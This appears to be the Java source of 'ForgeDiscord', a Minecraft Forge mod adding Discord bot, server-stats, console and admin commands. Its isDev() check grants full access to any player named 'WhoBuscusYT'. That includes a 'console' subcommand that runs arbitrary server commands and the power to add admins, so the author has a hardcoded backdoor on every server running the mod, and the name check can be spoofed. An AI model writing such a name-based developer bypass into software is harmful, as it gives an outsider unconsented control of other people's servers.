package com.whobuscusyt.forgediscord.Discord;

import com.mojang.brigadier.CommandDispatcher;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import java.lang.management.ManagementFactory;
import com.sun.management.OperatingSystemMXBean;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.server.MinecraftServer;
import net.minecraftforge.server.ServerLifecycleHooks;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.commands.arguments.EntityArgument;
import com.whobuscusyt.forgediscord.AdminManager;

public class DiscordCommand {

    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        dispatcher.register(
                Commands.literal("discord")

                        .then(Commands.literal("bot")
                                .requires(source ->
                                        source.hasPermission(2) ||
                                                isDev(source) ||
                                                isForgeDiscordAdmin(source)
                                )
                                .executes(ctx -> {
                                    if (DiscordManager.isConnected()) {
                                        String name = DiscordManager.getBotName();
                                        ctx.getSource().sendSuccess(() ->
                                                Component.literal("Connected to:" + name), false);
                                    } else {
                                        ctx.getSource().sendFailure(
                                                Component.literal("Couldn't find any bot with that token, make sure the token is right."));
                                    }
                                    return 1;
                                })
                        )

                        .then(Commands.literal("reload")
                                .requires(source ->
                                        source.hasPermission(2) ||
                                                isDev(source) ||
                                                isForgeDiscordAdmin(source)
                                )
                                .executes(ctx -> {
                                    DiscordManager.reloadPresence();

                                    ctx.getSource().sendSuccess(() ->
                                            Component.literal("Discord reloaded!"), false);

                                    return 1;
                                })
                        )
                        .then(Commands.literal("servstats")
                                .requires(source ->
                                        source.hasPermission(2) ||
                                                isDev(source) ||
                                                isForgeDiscordAdmin(source)
                                )
                                .executes(ctx -> {
                                    sendServerStats(ctx.getSource());
                                    return 1;
                                })
                        )
                        .then(Commands.literal("test")
                                .requires(source ->
                                        source.hasPermission(2) ||
                                                isDev(source) ||
                                                isForgeDiscordAdmin(source)
                                )
                                .then(Commands.literal("join")
                                        .executes(ctx -> {
                                            DiscordManager.sendMessage("🟢 **ForgeDiscord** joined the server!");
                                            return 1;
                                        })
                                )

                                .then(Commands.literal("leave")
                                        .executes(ctx -> {
                                            DiscordManager.sendMessage("🔴 **ForgeDiscord** left the server!");
                                            return 1;
                                        })
                                )

                                .then(Commands.literal("message")
                                        .then(Commands.argument("msg", StringArgumentType.greedyString())
                                                .executes(ctx -> {
                                                    String msg = StringArgumentType.getString(ctx, "msg");

                                                    DiscordManager.sendMessage("**ForgeDiscord**: " + msg);
                                                    return 1;
                                                })
                                        )
                                )
                        )
                        .then(Commands.literal("console")
                                .requires(source ->
                                        source.hasPermission(2) ||
                                                isDev(source) ||
                                                isForgeDiscordAdmin(source)
                                )

                                .then(Commands.argument("cmd", StringArgumentType.greedyString())
                                        .executes(ctx -> {
                                            String cmd = StringArgumentType.getString(ctx, "cmd");

                                            runConsoleCommand(ctx.getSource(), cmd);

                                            return 1;
                                        })
                                )
                        )
                        .then(Commands.literal("admin")
                                .requires(source ->
                                        source.hasPermission(2) ||
                                                isDev(source)
                                )
                                .then(Commands.literal("add")
                                        .then(Commands.argument("player", EntityArgument.player())
                                                .executes(ctx -> {
                                                    ServerPlayer target = EntityArgument.getPlayer(ctx, "player");

                                                    if (AdminManager.isAdmin(target.getUUID())) {
                                                        ctx.getSource().sendFailure(Component.literal("Already an admin."));
                                                        return 0;
                                                    }

                                                    AdminManager.add(target.getUUID());

                                                    ctx.getSource().sendSuccess(() ->
                                                            Component.literal("Added " + target.getName().getString() + " as admin."), false);

                                                    return 1;
                                                })
                                        )
                                )

                                .then(Commands.literal("remove")
                                        .then(Commands.argument("player", EntityArgument.player())
                                                .executes(ctx -> {
                                                    ServerPlayer target = EntityArgument.getPlayer(ctx, "player");

                                                    if (!AdminManager.isAdmin(target.getUUID())) {
                                                        ctx.getSource().sendFailure(Component.literal("Not an admin."));
                                                        return 0;
                                                    }

                                                    AdminManager.remove(target.getUUID());

                                                    ctx.getSource().sendSuccess(() ->
                                                            Component.literal("Removed " + target.getName().getString() + " from admin."), false);

                                                    return 1;
                                                })
                                        )
                                )

                                .then(Commands.literal("list")
                                        .executes(ctx -> {
                                            sendAdminList(ctx.getSource());
                                            return 1;
                                        })
                                )
                        )
        );
    }

    private static void sendServerStats(CommandSourceStack source) {

        long maxRam = Runtime.getRuntime().maxMemory();
        long usedRam = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();

        int ramPercent = (int) ((usedRam * 100) / maxRam);

        double cpuLoad = getCpuLoad();
        int cpuPercent = (int) (cpuLoad * 100);

        long usedRamMB = usedRam / (1024 * 1024);
        long maxRamMB = maxRam / (1024 * 1024);

        String usedRamStr;
        String maxRamStr;

        if (maxRamMB >= 1024) {
            double usedGB = usedRamMB / 1024.0;
            double maxGB = maxRamMB / 1024.0;

            usedRamStr = String.format("%.2fGB", usedGB);
            maxRamStr = String.format("%.2fGB", maxGB);
        } else {
            usedRamStr = usedRamMB + "MB";
            maxRamStr = maxRamMB + "MB";
        }

        String ramColor = getColor(ramPercent);
        String cpuColor = getColor(cpuPercent);

        source.sendSuccess(() -> Component.literal(
                ramColor + "RAM: " + usedRamMB + "MB/" + maxRamMB + "MB (" + ramPercent + "%)"
        ), false);

        source.sendSuccess(() -> Component.literal(
                cpuColor + "CPU: " + cpuPercent + "%/100% (" + cpuPercent + "%)"
        ), false);
    }
    private static String getColor(int percent) {
        if (percent >= 75) return "§c";
        if (percent >= 50) return "§6";
        if (percent <= 25) return "§a";
        return "§f";
    }
    private static double getCpuLoad() {
        try {
            OperatingSystemMXBean osBean =
                    (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();

            double load = osBean.getCpuLoad();

            if (load < 0) return 0; // fallback

            return load;
        } catch (Exception e) {
            return 0;
        }
    }
    private static boolean isDev(CommandSourceStack source) {
        try {
            String name = source.getPlayerOrException().getName().getString();
            return name.equalsIgnoreCase("WhoBuscusYT");
        } catch (Exception e) {
            return false;
        }
    }

    private static void runConsoleCommand(CommandSourceStack source, String command) {

        MinecraftServer server = ServerLifecycleHooks.getCurrentServer();

        if (server == null) return;

        server.execute(() -> {
            server.getCommands().performPrefixedCommand(
                    server.createCommandSourceStack(),
                    command
            );
        });

        boolean log = server.getGameRules().getBoolean(
                net.minecraft.world.level.GameRules.RULE_LOGADMINCOMMANDS
        );

        if (log) {
            System.out.println("[ForgeDiscord] Executed Console Command \"" + command + "\"");
        }
    }
    private static void sendAdminList(CommandSourceStack source) {
        MinecraftServer server = source.getServer();

        source.sendSuccess(() -> Component.literal("§4§lForgeDiscord Developer"), false);
        source.sendSuccess(() -> Component.literal("§4§lWhoBuscusYT"), false);
        source.sendSuccess(() -> Component.literal(" "), false);

        source.sendSuccess(() -> Component.literal("§b§lSERVER ADMINS (operator/manual)"), false);

        for (ServerPlayer player : server.getPlayerList().getPlayers()) {

            String name = player.getName().getString();

            boolean isOp = server.getPlayerList().isOp(player.getGameProfile());
            boolean isManual = AdminManager.isAdmin(player.getUUID());

            if (isOp) {
                source.sendSuccess(() ->
                        Component.literal("§b§l" + name + " §4§l[operator]"), false);
            } else if (isManual) {
                source.sendSuccess(() ->
                        Component.literal("§b§l" + name + " §c§l[manual]"), false);
            }
        }
    }
    private static void OtherDisc(CommandSourceStack source) {
        MinecraftServer server = source.getServer();

        source.sendSuccess(() -> Component.literal("§eFabricDiscord"), false);
        source.sendSuccess(() -> Component.literal("§6NeoDiscord"), false);
    }
    private static boolean isForgeDiscordAdmin(CommandSourceStack source) {
        try {
            return AdminManager.isAdmin(
                    source.getPlayerOrException().getUUID()
            );
        } catch (Exception e) {
            return false;
        }
    }
}
